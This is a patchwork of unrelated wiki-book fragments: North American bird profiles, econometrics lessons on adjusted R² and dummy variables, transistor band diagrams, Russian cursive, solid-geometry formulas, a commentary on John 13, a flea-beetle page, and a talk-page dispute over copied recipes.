Brown-headed Cowbirds are permanent residents in the southern parts of their range; northern birds migrate to the southern United States and Mexico. They often travel in flocks, sometimes mixed with Red-winged Blackbirds or European Starlings.

These birds forage on the ground, often following grazing animals such as horses and cows to catch insects stirred up by the larger animals. They mainly eat seeds and insects.

At one time, the Brown-headed Cowbird followed the bison herds across the prairies. Their parasitic nesting behavior complemented this nomadic lifestyle. Their numbers expanded with the clearing of forested areas and the introduction of new grazing animals by settlers across North America. Brown-headed Cowbirds are now commonly seen at suburban birdfeeders.

Brown-headed Cowbird females can lay 36 eggs in a season. Over 140 different species of birds are known to have raised young cowbirds. Host parents may sometimes notice the cowbird egg. Different species react in different ways. Gray Catbirds destroy the egg by pecking it. Some species may simply build a new layer over the bottom of the original nest. Brown-headed cowbird nestlings are sometimes expelled from the nest.

      <comment>/* Goodness of Fit */</comment>
      <text xml:space="preserve">Our first regressions (MLE and OLS) were bivariate. Our lines were simple, two variable lines. However, in most economic data, there are a multitude of possible independent things that can effect a dependent variable. So we can expand our explanatory functions to allow multiple independent variables. 

Instead of our functions looking like &lt;math&gt;Y_=\alpha + \beta X_i + \epsilon_i&lt;/math&gt;, our functions look like &lt;math&gt;Y_i = \beta_0 + \beta_1 X_{1,i} + \beta_2 X_{2,i} + \cdots + \beta_n X_{n,i} + \epsilon_i &lt;/math&gt;

By adding more variables and data to our model, we can hopefully get a better fit and understanding of the dependent variable. However, with the added variables come added problems that will misguide our model. 

==Goodness of Fit==
When we move to the multiple regression case, our goodness of fit looks much like it previously did in the bivariate case. TSS = ESS + RSS. Our  R² = ESS/TSS) = 1 - (RSS/TSS). We can still use our Coefficient of Determination, R² (R² = ESS/TSS = 1 - (RSS/TSS)), but there is a problem associated with it. R² will never decrease because of an addition of a variable, whether or not it helps us explain our dependent variable. When we add a new variable to the function, the ESS is calculated over a larger set of variables, and ESS will be greater than or equal to what we had before. This will cause our R² to increase, even if the addition of our new variable hurts our model. There is a tool to fix this problem. R² is replaced with ''Adjusted R²'' which adjusts it for the added degrees of freedom. Adjusted R² is signified by adding a bar above the 'R.'

&lt;math&gt; \bar{R^2} = 1 - (\frac{\hat{var(\epsilon)}} {\hat{var(Y)}})&lt;/math&gt;

==Band Diagrams==

We can consider the action of an NPN BJT using band diagrams. With no applied voltages, we see the following shape:

[[image:NPN Band Diagram Equilibrium.svg|centre]]

Clearly, no current can flow, as the &quot;hump&quot; in the middle stops current in both directions. Now, if we apply voltages as we did above we get the following result:

[[image:NPN Band Diagram Active.svg|centre]]

The EBJ potential barrier lowers, and some electrons can drift across into the base, whereupon they are swept up by the electric field from the collector, and &quot;fall&quot; down the potential hill into the collector. A few holes also diffuse from base to emitter.</text>

| description = The '''Red-headed Woodpecker''', ''Melanerpes erythrocephalus'', is a small or medium-sized woodpecker.

Adults have a black back and tail with a red head and neck. Their underparts are mainly white. The wings are black with white secondaries.  Non-birders often mistakenly identify the Red-bellied Woodpecker as this species.

Their breeding habitat is open country across southern Canada and the eastern-central United States. They nest in a cavity in a dead tree or a dead part of a tree.

Northern birds migrate to the southern parts of the range; southern birds are often permanent residents.

These birds fly to catch insects in the air or on the ground, forage on trees or gather and store nuts. They are omnivorous, eating insects, seeds, fruits, berries and nuts.
Once abundant, populations have seriously declined since 1966 due to increased nesting competition from starlings and removal of dead trees (used as nesting sites) from woodlands. Many Northeastern states no longer have nesting red-headed woodpeckers.

They give a &quot;tchur-tchur&quot; call or drum on territory.

The red-headed woodpecker is listed as a vulnerable species in Canada and as a threatened species in some states in the US. The species has declined in numbers due to habitat loss caused by harvesting of snags, agricultural development, channeling of rivers, a decline in farming resulting to regeneration of eastern forests, monoculture crops, the loss of small orchards, and treatment of telephone poles with creosote.

      <text xml:space="preserve">Health insurance companies often charge differently for different types of people. They know off of their own data, that young adults are in less need of a doctor generally, and so they charge less for insurance. Their data shows that age and health costs are positively correlated and indeed one &quot;causes&quot; another. There are other demographics off of which they organize their prices of coverage. One is whether or not the customer is a smoker, and some even use gender. But how did they come to the conclusion that smokers cost more to cover, or that the cost of covering a man is different from a woman? These are not quantitative pieces of data, so they cannot be regressed, right? Well no, we can make it look like they are in fact quantitative, and not qualitative. 

==Dummy Variables==
'''Dummy Variables''' or '''Indicator Variables''' are these qualitative data points manipulated to be quantitative. In the case of correlating health costs to smoking habits, we can say that a smoker is a ''1'' and a non-smoker is a ''0''. Our dependent variable is health care costs.

Our model will look like this: &lt;math&gt; Y_i = \alpha + \beta D_i + \epsilon_i &lt;/math&gt; where D is our dummy (Smoking) and Y is our Dependant (health care costs). Say that health care costs are $50 for non-smokers, and $60 for smokers, our model would then be &lt;math&gt; Y_i = 50 + 10 D + \epsilon_i &lt;/math&gt;. When the person we are looking at is a non-smoker, D = 0, and when the person we are looking at is a smoker, D = 1.

We can regress with multiple pieces of information (variables) too. We can also mix our normal data with several dummies. &lt;math&gt; HeathCare_i = \beta_1 age_i + \beta_2 Smoke_i + \beta_3 Gender_i + \epsilon_i &lt;/math&gt; (Gender = 1 for male, Gender = 0 for female)

Our estimated model off of the data would be &lt;math&gt; HeathCare_i = \hat{\beta_0} age_i + \hat{\beta_1} Smoke_i + \hat{\beta_2} Gender _i + \epsilon_i &lt;/math&gt;

The formula for a 29 year old male who does not smoke would be &lt;math&gt; HeathCare_i = \hat{\beta_0} 29 + \hat{\beta_2} + \epsilon &lt;/math&gt;

Our Dummy Variables can be more than just binary. Say health care companies found out that happiness can lead to higher health, and they wanted to use that in their price discrimination scheme. They can ask &quot;how happy are you?, Very Happy, Kind of Happy, Sad.&quot; However, they will need to use two dummies for this move. D1 will be 1 and D2 will be 0 if &quot;Very Happy&quot;, D1 will be 0 and D2 will be 1 if &quot;Kind of Happy&quot; and D1 will be 0 and D2 will be 0 if &quot;sad.&quot;

To add this into our model we will have &lt;math&gt; HeathCare_i = \hat{\beta_0} age_i + \hat{\beta_1} Smoke_i + \hat{\beta_2} Gender_i + \hat{\beta_3} VeryHappy_i + \hat{\beta_4} KindOfHappy_i + \epsilon_i &lt;/math&gt;


==Slope vs Intercept shifts==

The Dummies can affect the model in two ways. The Dummy can either shift the intercept up or down, or shift the slope shallower or deeper. What has been described above are all intercept shifts. The line stayed neutral for non-smokers, and moved up for smokers. For a slope shift, the dummy is in the same term as the standard variable as in &lt;math&gt; Y_i = \alpha + \beta_1 X_i + \beta_2 D_i X_i + \epsilon &lt;/math&gt; where if D = 1, &lt;math&gt; Y_i = \alpha + (\beta_1 + \beta_2) X_i + \epsilon&lt;/math&gt; and if D = 0 &lt;math&gt; Y_i = \alpha + \beta_1 X_i + \epsilon &lt;/math&gt;

''Note: The combination of the dummy and the standard in this case is an interaction term. It is often described as one variable as in &lt;math&gt; D_i X_i = Z_i &lt;/math&gt;

| description = The '''Pileated Woodpecker''' (''Dryocopus pileatus'') is a very large North American woodpecker.

Adults (40-49 cm long, 250-350 g weight) are mainly black with a red crest and a white line down the sides of the throat. Adult males have a red line from the bill to the throat and red on the front of the crown. In adult females, these are black. They show white on the wings in flight. The only North American birds of similar plumage and size are the Ivory-billed Woodpecker of the Southeastern United States and Cuba, and the related Imperial Woodpecker of Mexico. Both of those species are extremely rare, if not extinct.

Their breeding habitat is forested areas with large trees across Canada, the eastern United States and parts of the Pacific coast. They usually excavate large nests in the cavities of dead trees, and often excavates a new home each year, creating habitat for other large cavity nesters.

This bird is usually a permanent resident.

These birds mainly eat insects (especially beetle larvae and carpenter ants) as well as fruits, berries and nuts. They often chip out large and roughly rectangular holes in trees while searching out insects.

The call is a wild laugh, similar to the Northern Flicker. Its drumming can be very loud, often sounding like someone striking a tree with a hammer. This bird favors mature forests, but has adapted to use second-growth stands and heavily wooded parks as well.

* The pileated woodpecker is also commonly known in the south as an &quot;Indian Hen&quot;
* The roost of a Pileated Woodpecker usually has multiple entrance holes.
* The sound that a Pileated Woodpecker makes when boring a hole in a tree is so loud that it can be heard over long distances.
* Pileated Woodpeckers make such large holes in dead trees that sometimes the holes can cause a small tree to break in half.
* Pileated Woodpeckers have been observed to move their eggs which have fallen off the nest to another site. This is a rare habit in other birds.

| description = The '''Ruby-throated Hummingbird''' (''Archilochus colubris''), is a small hummingbird. It is the most common species of hummingbird in the eastern half of North America and the only hummingbird that breeds east of the Mississippi River.

The Ruby-Throated Hummingbird is 7-9 cm long with an 8-11 cm wingspan, and weighs 2-6 g. Adults are solid metallic green above and greyish white below, with near-black wings. The bill is moderately long, straight and very slender. The adult male has an iridescent ruby red throat patch (gorget) narrowly bordered in black at the upper margin, which may appear black in some lighting, and a dark forked tail. The female has a slightly notched tail with outer feathers banded in green, black, and white and a whitish throat that may be plain or lightly marked with dusky streaks or stipples. The male is smaller than the female, and has a slightly shorter bill. A moult of feathers occurs once per year, beginning in late summer, pausing during migration, and resuming on the wintering grounds.

The breeding habitat is throughout most of eastern North America and southern Canada, in deciduous and pine forests and forest edges, orchards, and gardens. The female builds a nest in a protected location in a shrub or tree. 

The Ruby-throated Hummingbird is migratory, most individuals spending the winter in Mexico or Central America.

Ruby-throated hummingbirds are solitary. Adults of this species typically only come into contact for the purpose of mating, and both males and females of any age aggressively defend feeding locations within his or her territory. The aggressiveness becomes most pronounced in late summer to early fall as they fatten up for migration. They  feed frequently while active during the day and  when temperatures drop, particularly on cold nights, they may conserve energy by entering hypothermic torpor. 

The birds feed on nectar from flowers and flowering trees using a long extendable tongue or catch insects on the wing. Tree sap and the juices of overripe fruits may substitute for nectar. Due to their small size, they are vulnerable to insectivorous predators such as flycatchers, mantids, large spiders, and large frogs. 
Females lay two white eggs averaging {{units|12.9 by 8.5 mm|0.5 by 0.3 in}}.

[[Image:LeninsHangingOrder1.gif|thumb|An example]]
'''Russian cursive''' ('''русские рукописные буквы''', ''russkiye rukopisnyye bukvy'') is a basic part of studying the Russian language. Because most written Russian is cursive, learning '''cursive''' is fundamental to understanding other Russians. 

On the whole, writing cursive is very similar to those familiar with English cursive, but this material will start from the most elementary level of Russian cursive.

The samples of writing of russian cursive are shown on the following picture. The letters &quot;ъ&quot;, &quot;ь&quot; and &quot;ы&quot; can't be capitalized, because Russian words never begin with them.

Some people write &quot;т&quot; as it appears on typographic fonts (not like english &quot;m&quot;). Others have a different way of writing capital &quot;П&quot; and &quot;Т&quot; (Lenin was one of them - look at the &quot;Т&quot; in &quot;Т-щи&quot;). Some people (if they write &quot;т&quot; like in this example) put a little lines over &quot;т&quot; and under &quot;ш&quot;? to make this distinction more obvious.
== Basic information ==
*'''''[[w:Cursive|Cursive]]''''' is a style of writing in which most if not all letters in one word are connected by ancillary serifs. With this method, a single word can usually be written in one stroke.
*Russian culture highly regards cursive, similar to the way Chinese culture exalts good calligraphy. 

==  External links  ==
*Sample of '''Russian cursive''' can be found here: http://gakish.com/russkij-yazyk/propisi-russkij-alfavit.htm

      <text xml:space="preserve">== Prisms ==
An n-sided prism is a polyhedron made of an n-sided polygonal base, a translated copy, and n faces joining corresponding sides. Thus these joining faces are parallelograms. All cross-sections parallel to the base faces are the same. A prism is a subclass of the prismatoids.

The volume of a prism is the product of the area of the base and the distance between the two base faces, or height. In the case of a non-right prism, the height is the perpendicular distance.

[[Image:Square Prism Labeled.png]]

In the following formula, V=volume, A=base area, and h=height.

&lt;math&gt;V=Ah&lt;/math&gt;

The surface area of a prism is the sum of the base area and its face, and the sum of each side area, which for a rectangular prism is equal to:
*&lt;math&gt;SA = 2lw + 2lh + 2wh&lt;/math&gt;
**where ''l'' = length of the base, ''w'' = width of the base, ''h'' = height

== Pyramids ==
The volume of a Pyramid can be found by the following formula:
&lt;math&gt;\frac{1}{3} A h&lt;/math&gt;
*''A'' = area of base, ''h'' = height from base to apex
The surface area of a Pyramid can be found by the following formula:&lt;math&gt;A = A_b + \frac{ps}{2}&lt;/math&gt;
*&lt;math&gt;A&lt;/math&gt; = Surface area, &lt;math&gt;A_b&lt;/math&gt; = Area of the Base, &lt;math&gt;p&lt;/math&gt; = Perimeter of the base, &lt;math&gt;s&lt;/math&gt; = slant height.

== Cylinders == 
The volume of a Cylinder can be found by the following formula:
&lt;math&gt;\pi r^2 \cdot h&lt;/math&gt; 
*''r'' = radius of circular face, ''h'' = distance between faces
The surface area of a Cylinder including the top and base faces can be found by the following formula:
&lt;math&gt;2 \pi r\ (r+h) &lt;/math&gt;
*&lt;math&gt;r\,&lt;/math&gt; is the radius of the circular base, and &lt;math&gt;h\,&lt;/math&gt; is the height

== Cones ==
The volume of a Cone can be found by the following formula:
&lt;math&gt;\frac{1}{3} \pi r^2 h&lt;/math&gt;
*''r'' = radius of circle at base, ''h'' = distance from base to tip

The surface area of a Cone including its base can be found by the following formula:
&lt;math&gt;\pi\ r (r + \sqrt {r^2 + h^2})&lt;/math&gt;
*&lt;math&gt;r\,&lt;/math&gt; is the radius of the circular base, and &lt;math&gt;h\,&lt;/math&gt; is the height.

== Spheres == 
The volume of a Sphere can be found by the following formula:
&lt;math&gt;\frac{4}{3} \pi r^3&lt;/math&gt; 
*''r'' = radius of sphere
The surface area of a Sphere can be found by the following formula: 
&lt;math&gt;4 \pi\ r^2&lt;/math&gt;
* ''r'' = radius of the sphere

      <text xml:space="preserve">==John Chapter 13 Verses 1-17==

In the beginning of this Chapter Jesus is having dinner with his disciples; however, it is the foot-washing that marks the special significance of the occasion.  The supper had already begun when Jesus rose from the table and began washing the disciples' feet. Then Peter objects, saying that he is unworthy to have his feet washed by Jesus.  He says this because of the typical station of one who washes feet; typically a slave or servant.  Traditionally, the task of washing the feet was reserved for Gentile slaves, for wives, and for children and Jewish men were not required to do so. The only exception was when disciples washed the feet of their rabbis. The disciples' obvious bewilderment is then coupled with a powerful teaching from Jesus; saying that this is what he is going to do for the world, and that his disciples should follow his example.  Is it another &quot;coincidence&quot; that first, Jesus must be a slave of all and serve before he can present his life as a ransom for many?  Another example that was set forth was so that the disciples may learn to perform similar service for one another.

The reader should pay close attention to the opening statement in which they are given three important facts: 1.what time it is by the Jewish calendar; 2. what time it is in Jesus' ministry; 3. and Jesus' own disposition and intention.  13:1 states, &quot;Now before the festival of the Passover, Jesus knew that his hour had come to depart from this world and to go to the Father.&quot;  The fact that the Last Supper occurs before Passover and not during has caused some questions since Jesus called it the Passover meal.

The Maccabees had changed the calendar and the Essenes were keeping the correct day which began after sunset at the beginning of Tuesday. The new day began in Israel right after sunset. The only group celebrating the passover on Tuesday was the Essenes. They were vegetarians  and did not believe that Yah had required animals sacrifices. By celebrating the Essene date Jesus is clearly distancing himself from the Passover lamb. He never called himself a lamb, but called himself a shepherd. He is also joining the Essenes in repudiating the sacrificial system.

Yah did not sacrifice his son as pagan gods did. Nor did Jesus offer himself as a sacrifice the way pagan kings offered human sacrifices to their pagan Gods.  

Jesus taught us that the angry gods who needed blood to satiate their wrath had nothing in common with the  God of the Bible.

==The Beloved Disciple in John 13==  
Very curious language is used to describe the Beloved Disciple in John Chapter 13.  The disciple is said to be &quot;reclining next to Him&quot; when asked to prompt Jesus about the identity of his betrayer, at which point the disciple is &quot;leaning back against Jesus&quot; to ask Him (Verses 23-5).  This is indicative of a very close relationship with Christ, as physical contact with Him is not by any means a casual matter in the Gospels. Moreover, this disciple has enough gall to ask Jesus who he is talking about, and Jesus actually answered. It is very likely that Jesus did not speak to the entire group of disciples when he explained which would be the betrayer; instead, he was probably speaking quietly to the beloved disciple--almost like they were sharing secrets. This is another indicator of the close relationship the two had. This disciple was also revered by the others, as it is Simon Peter who desires to go through him / her to ask Christ the question.  So who was this disciple, and exactly how was he / she loved by Christ?  Scholars such as Ann Graham Bock and Carl McCloud suggest that Mary Magdalene was the Beloved Disciple, a notion that would put the cozy language in John 13 in interesting light. There is also speculation that Lazarus is the beloved disciple, as Mary and Martha refer to him as &quot;the one Jesus loves.&quot;  Others would say that it is John himself who was Jesus' &quot;beloved disciple&quot; as he only appears in John's gospel and none of the others.

==The Washing of Feet John 13:4-12==

Jesus does the unthinkable in these passages; He washes His disciple’s feet. Of course His disciples immediately begin to reject this act, but Jesus answers them with &quot;What I do you do not realize now, but you shall understand hereafter.&quot; (NIV v.7)What is the main principle the disciples needed to learn? Some believe that the disciples were being taught to humble themselves and to believe that no one is better than another. A similar belief is that Jesus was simply acting out and foretelling His new commandment which He would reveal later on: V.34 “A new commandment I give to you, that you love one another, even as I have loved you, that you also love one another.&quot; (NIV) One view is that Jesus was trying to teach the &quot;value of spiritual washing, and the cleansing of the soul from the pollutions of sin&quot; (''Bible Gateway'') Jorge Perez and his church believe that Jesus was simply teaching His disciples to not only humble themselves and to serve, but to also learn how to receive. To truly love someone like Christ loved them, His Disciples must be able to receive love from others as well. 


== 13:26-30 ==

In these verses Jesus talks about the one who will betray him.  In response to the beloved's question of who will betray him, Jesus answers that the one who he gives the dipped morsel of bread to is the one that will betray him.  The odd thing is though that after he does this and hands the dipped bread to Judas, the disciples do not realize that Judas is the guilty one.  They think that somehow Jesus handing the bread to him coincides with him sending him on an errand for the festival.  However, their minds may be clouded and they cannot realize the truth in order to fulfill the prophecy that the disciples will not understand all that Jesus says till later.  That is one suggestion.  The other, more plausible explanation is that the question was part of a private conversation heard only by a few of the disciples, namely Judas, John, Peter, and then Jesus, leaving these people to really know the significance of the gesture (Speer 416).  That is why so many disciples still questioned and did not know who was the betrayer. 


==Chapter 13:31-35==
 
In these verses, Jesus begins his farewell speech.  The first part of the farewell speech is characterized by a sequence of questions by his disciples and Jesus’ answers.  Initially, Jesus gets the sequence started by speaking of his glorification (vv.31-32), his departure (v.33), and his divine love (vv. 34-35).  These three themes are developed throughout his speech.  While there are other major themes in ''John'' as well, these five verses contain the major themes of the entire farewell speech.  Maybe the purpose of his farewell speech is to tell his disciples of the new ways in which they will love in the future especially in verses 34-35.  Jesus gives a new command to his disciples, which is to love one another as I have loved you.  This divine love that the disciples are to share is for the whole world that is part of God’s plan.  God’s love has now mediated in a new way, through the incarnation.  The disciples enter into a relation of love that exists between the Father and the Son (Barrett, 1978).  Our community is to continue to manifest God as Jesus has done, thereby shining as a light that continues to bring salvation.  Without this divine love their message of what God has done in Christ would be hollow (Gospel Communications, 2007).

Jesus challenges the disciples in Chapter 13.  He tells them that one of them will betray him that night and hand him over to the Romans and Jews to be killed.  The disciples are shocked by this and ask who it is that will betray Jesus.  Jesus also challenges Peter at the end of the chapter.  Peter says he will die with Jesus, but Jesus tells Peter that he will deny Jesus three times before the sunrise the next day.  Jesus challenges the disciples in this way to see if they are ready for the events that will be taking place soon after the Last Supper.

'''Palestriped Flea Beetles''' are a pest of many food crops, and can also cause damage to ornamentals, particularly when the host plants are young. 

==Description==
Adult beetle is yellow through brown or black with a paler stripe on each wing cover, and a red head. Like all [[../Flea Beetles/]], they jump away when disturbed. Grubs are long and thin.

==Symptoms and Signs==
Grubs cause root damage, particularly to tubers such as potatoes or sweet potatoes. Adults cause shotholing or skeletonized leaves, particularly of young plants.

==Ecology==
Overwinters as an adult in debris.

==Host plants==

Good luck! --[[User:Herbythyme|&lt;font color=&quot;green&quot;&gt;Herby&lt;/font&gt;]] &lt;b&gt;&lt;sup&gt;&lt;small&gt;&lt;span style=&quot;color:#90F&quot;&gt;[[User talk:Herbythyme|talk thyme]]&lt;/span&gt;&lt;/small&gt;&lt;/sup&gt;&lt;/b&gt; 16:21, 22 March 2007 (UTC)

== Recipes ==

Hi - the recipes that you have added all look as though they come from a website ([http://www.videojug.com/]) which has a copyright statement at the bottom of each page.  If that is the case these will all have to be deleted as we cannot accept copyright materials here.  Thanks --[[User:Herbythyme|&lt;font color=&quot;green&quot;&gt;Herby&lt;/font&gt;]] &lt;b&gt;&lt;sup&gt;&lt;small&gt;&lt;span style=&quot;color:#90F&quot;&gt;[[User talk:Herbythyme|talk thyme]]&lt;/span&gt;&lt;/small&gt;&lt;/sup&gt;&lt;/b&gt; 16:58, 22 March 2007 (UTC)
:Thanks for the message - as far as I am aware without specific written permission from the owners of the website t the Wikimedia foundation it would not be possible to host these pages as they are absolute copies.  Please look at [[Wikibooks:Copyrights]] and then maybe [[Help:Boilerplate request for permission]].  I would also like a pointer to where you were given permission on Wikipedia to use the material and the admin's name - copyright policy is the same across all Wikimedia projects.  Thanks --[[User:Herbythyme|&lt;font color=&quot;green&quot;&gt;Herby&lt;/font&gt;]] &lt;b&gt;&lt;sup&gt;&lt;small&gt;&lt;span style=&quot;color:#90F&quot;&gt;[[User talk:Herbythyme|talk thyme]]&lt;/span&gt;&lt;/small&gt;&lt;/sup&gt;&lt;/b&gt; 09:48, 23 March 2007 (UTC)
:In practice an initial read of your Wikipedia page looks like the reverse --[[User:Herbythyme|&lt;font color=&quot;green&quot;&gt;Herby&lt;/font&gt;]] &lt;b&gt;&lt;sup&gt;&lt;small&gt;&lt;span style=&quot;color:#90F&quot;&gt;[[User talk:Herbythyme|talk thyme]]&lt;/span&gt;&lt;/small&gt;&lt;/sup&gt;&lt;/b&gt; 09:50, 23 March 2007 (UTC)

::OK for a much better view on licensing throughout Wikimedia please look at [http://commons.wikimedia.org/wiki/Commons:Licensing Commons:Licensing].  This will specifically direct you towards the license requirements and how to fulfill them on any Wikimedia project.  This will deal with the copying aspect.  There is then the acceptability of this to Wikibooks.  In my view and understanding Wikibooks should not be used to promote websites of any sort in any way.  When I have written this I will place a query in the staff lounge (I'll send you the link when I have done it) in order to get a wider opinion on this than just mine.  Please do not make further contributions until this is resolve (&amp; I will not delete any pages you have contributed until then too) --[[User:Herbythyme|&lt;font color=&quot;green&quot;&gt;Herby&lt;/font&gt;]] &lt;b&gt;&lt;sup&gt;&lt;small&gt;&lt;span style=&quot;color:#90F&quot;&gt;[[User talk:Herbythyme|talk thyme]]&lt;/span&gt;&lt;/small&gt;&lt;/sup&gt;&lt;/b&gt; 10:08, 23 March 2007 (UTC)

----

Reever2, I would like to let you know that I'm not so concerned with the &quot;external links&quot; as Herbythyme has expressed here, but I am concerned about the potential copyright violations.  We are cautious, almost to the point of paranoia (some would say even beyond that), to make sure that all of the content which is contributed to our project is contributed legally.  We go way beyond what is legally required in terms of being a &quot;safe harbor&quot; and aggressively go after copyright violations which we detect through a number of methods.  One of the reasons for this is that we do intend in the future to be able to redistribute and possibly sell the content here on Wikibooks in other formats besides just web pages.

A general assurance that you have permission to copy this content is not very comforting, especially when we aren't completely certain that you are who you claim to be here.  It makes our job much easier if the web page itself grants explicit permission to use the content under terms like the [[GFDL]], or we have some way to verify independently that permission has been formally granted to this project.  This is mainly trying to build some sort of trust relationship that the rest of our on-line community can also rely upon, and to make sure that if we reuse this content elsewhere (under the terms of the GFDL) that we can do that legally.  We do not permit a license &quot;for use only on Wikibooks&quot;.  I hope you can understand this.  We are not asking you to give up copyright here, but you must explicitly grant us a license to redistribute this content to other places, including commercial usage, under the terms of this specific content license.  Most of our participants understand this philosophy, so it generally isn't a problem, especially when content is added a paragraph or two at a time and heavily edited and rephrased.

As far as the external links are concerned, we tend to discourage redundant links unless they add significant additional value or are of a bibliographic nature.  I understand the desire to try and build up external links to your website, but explicit links with what appears to be a desire to improve page rankings with search engines is seen as a form of [[w:Spamdexing|link spamming]].  We deal with this so often that the automatic response is to remove any such links until somebody can give a strong reason for including them in a page.  This is nothing against you or your company, but we say the same thing to everybody who tries to do this.  I realize that the video files themselves to add some value to these recipes, but our desire is to have all multimedia like this to be included under the same terms as the text itself as well.  That isn't strictly necessary, but it does help as we intend to redistribute this content on CD-ROMs and other sorts of formats where an on-line link may not always be easy to access this content.

The Cookbook has a long history with this project, and in fact pre-dates the creation of this website and domain name.  I would like to encourage you to continue to make contributions here as long as they are either original creations or you have been given (and are able to document) permission to relicense the content under the terms of the GFDL.  --[[User:Robert Horning|Rob Horning]] 11:19, 23 March 2007 (UTC)

:You said &quot;Hi, Thanks for your comments. I have read the copyright obligations for Wikibooks, and am happy with your explanation. So can i get this straight- as long as i have permission to distribute this content i am ok to post. You can contact me on robert.reeve@videojug.com if you would like verification that i am in fact an employee of this company, and therefore have copyright permission. As for the external links- Google do not add page ranking (give added Search engne ranking benefits)to our site from any wiki pages, so we are not doing it for those reasons. We are trying to add good quality content to your site, and hopefully (i'm going to be honest) gain some referrals to our site. If you do distribute this material onto CD-Roms etc- our copyright will remain (that is correct isn't it!)&quot; -- &lt;small&gt;—The preceding [[w:Wikipedia:Sign your posts on talk pages|unsigned]] comment was added by [[User:Reever2|Reever2]] ([[User talk:Reever2|talk]] • [[Special:Contributions/Reever2|contribs]]) {{{2|}}}.&lt;/small&gt;

::I would like to point out that you may have permission to distribute this content, but do you have authority (usually something delegated to a CEO or vice-president level here who has legal authority to sign a contract on behalf of the company... not a mere employee) to relicense the terms of content redistribution?  This is a big deal, as the copyright disclaimer on your website is quite clear that your company will only give permission to redistribute content from that website with explicit permission... especially if it is for commercial purposes.  The GFDL requires that commercial purposes are explicitly allowed, although other restrictions are in place instead.  It is this sort of permission, from either the head of your company or the legal counsel (a barrister or an attorney) of your company that is needed.  If you are the head of this company or have this level of authority, this sort of permission would then be fine.  Unless it is a very small company that you work for, it is very unlikely that you have this level of authority.

::As for the Google rankings, I won't get into the details here, but links from Wikimedia projects do, unfortunately (for us in dealing with this) have an impact on site rankings.  It is only one of several factors, but it can bump your website up several notches when links do come from this website.  Wikipedia more so, but Wikibooks is one of the top 3000 websites in the world according to some measures of web traffic.  This may not be your intention, and for that I can understand.  As I said, the page links are something we can discuss and try to come to some sort of understanding on what is fair and what is not later one.  The big issue here really is the copyright violation.

::In terms of you owning copyright, yes, that does not change.  All we are asking for is a license to use this content under some very strict and well defined terms that have even had legal review by barristers, solicitors, and lawyers in many countries throughout the world.  Whole books and websites are devoted to discussing the fine points of this license, so I'm not asking you here to agree to terms that are hidden or havn't been reviewed at length.  Of course you might want to review these terms yourself and see if they are in line with how you and your company would be willing to allow us to redistribute this content.  You still retain copyright to this content, and are free to distribute this content under any other terms that you choose, including any mention that it may be available for free elsewhere, or under terms like the Microsoft End-User License Agreement.  We don't want the copyright ownership here, nor are we really set up to take ownership if it is given.  --[[User:Robert Horning|Rob Horning]] 18:06, 23 March 2007 (UTC)

Thanks Robert for your help on this matter. It is being dealt with as we speak, but i would like to point out that the Wikipedia links don't help with page rankings, google search terms, or any other SEO benefit. SEO is a massive part of my job, and i can tell you now that Google (90% of web traffic) doesn't look at Wikipedia links (backlinks) in their algorithm. It has recently been publicized hugely in all SEO and digital marketing publications and conferences.

== Copyright issues ==

Hi - hopefully you will have been keeping up to date with the discussion in the staff lounge here [[Wikibooks:Staff_lounge/Chat#Cookbook.2Fcopyright_.26_links_issue]].  Reviewing this there is real concern over the copyright violation issue.  In practice I would suggest that it is likely the pages will be deleted over the next few days, however it is possible to retrieve them (or recreate them).

| description = The '''Whip-poor-will''' or '''whippoorwill''', ''Caprimulgus vociferus'', is a medium-sized (22-27 cm) nightjar, a type of nocturnal bird. The Whip-poor-will is commonly heard within its range, but less often seen.  It is named after its call.

Adults have mottled plumage: the upperparts are grey, black and brown; the lower parts are grey and black. They have a very short bill and a black throat. Males have a white patch below the throat and white tips on the outer tail feathers; in the female, these parts are light brown.

The Whip-poor-will's breeding habitat is deciduous or mixed woods across southeastern Canada, eastern and southwestern United States, and Central America. They nest on the ground, in shaded locations, among dead leaves, and usually lay two creamy eggs. This bird does not normally flush from the nest unless it is underfoot.

Northern birds migrate to the southeastern United States and south to Central America. Central American races are largely resident.
These birds forage at night, catching insects in flight. They normally sleep during the day.

| description =The '''Bobwhite Quail''', '''Northern Bobwhite''', or '''Virginia Quail''', ''Colinus virginianus'', is a ground-dwelling bird native to North America. The name derives from their characteristic call. 

The Bobwhite Quail is a member of the group of species known as New World quail.  These quail primarily inhabit areas of early successional growth dominated by various species of pine, hardwood, woody, and herbaceous growth. However, quail habitat varies greatly throughout their range which extends from Mexico east to Florida and north into the Upper Midwest and Northeast.

Bobwhites are distinguished by a black cap and black stripe behind the eye along the head. The area in between is white on males and yellow-brown on females. The body is brown, speckled in places with black or white on both sexes, and average weight is five to six ounces (145-200 grams).

It forms what are known as &quot;coveys&quot;, groups of five to 30 birds, during the non-breeding season (roughly October-April). During the breeding season, typically beginning in mid-April, the Bobwhite coveys dissolve. Social pairs are typically formed between individuals of unknown relationship. These social pairings potentially result in the formation of a mate bond and subsequent female fertilization and egg formation. Eggs are laid at a rate of approximately 1 per day, and they hatch after 23 days. Eggs are normally white with a more pointed end than normal chicken eggs. 

Both males and females can incubate nests, with most nests predominantly incubated by females. If the first clutch of eggs is unsuccessful, a breeding pair (may be the same pair or a different pair as that which led to the previous nesting attempt) will attempt to lay, incubate, and hatch additional clutches. If the clutch is successful, chicks are precocial and will leave the nest approximately 24 hours following hatching. The breeding season continues until mid-October, and successful nesters (females) can potentially lay, incubate, and hatch up to 3 clutches.

The Bobwhite's song is a rising, clear whistle, ''bob-Wight!'' or ''bob-bob-White!'' The call is most often given by males in spring and summertime.

| caption_1 = Ruffed Grouse
| description = The '''Ruffed Grouse''', ''Bonasa umbellus'', is a medium-sized grouse occurring in forests across Canada and the Appalachian and northern United States including Alaska.  They are non-migratory.

Ruffed Grouse have two distinct color phases, grey and red. In the grey phase, adults have a long square brownish tail with barring and a black subterminal band near the end. The head, neck and back are grey-brown; they have a light breast with barring. The ruffs are located on the sides of the neck. These birds also have a &quot;crest&quot; on top of their head, which sometimes lays flat.  Both sexes are similarly marked and sized, making them difficult to tell apart, even in hand.  The female often has a broken subterminal tail band, while males often have unbroken tail bands.  Another fairly accurate method for sexing ruffed grouse involves inspection of the rump feathers. Feathers with a single white dot indicate a female, feathers with more than one white dot indicate that the bird is a male. 

Ruffed Grouse have never been successfully bred in captivity.    

These birds forage on the ground or in trees. They are omnivores, eating  buds, leaves, berries, seeds, and insects.

